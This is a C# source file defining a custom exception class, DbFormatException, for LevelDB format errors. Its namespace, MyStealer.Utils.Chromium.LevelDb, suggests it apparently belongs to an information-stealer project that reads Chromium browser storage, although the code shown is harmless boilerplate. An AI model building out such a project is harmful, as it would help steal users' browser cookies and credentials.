using System;
using System.IO;

namespace MyStealer.Utils.Chromium.LevelDb
{
    public class DbFormatException : IOException
    {
        public DbFormatException() : base()
        {
        }

        public DbFormatException(string message) : base(message)
        {
        }

        public DbFormatException(string message, int hresult) : base(message, hresult)
        {
        }

        public DbFormatException(string message, Exception innerException) : base(message, innerException)
        {
        }
    }
}
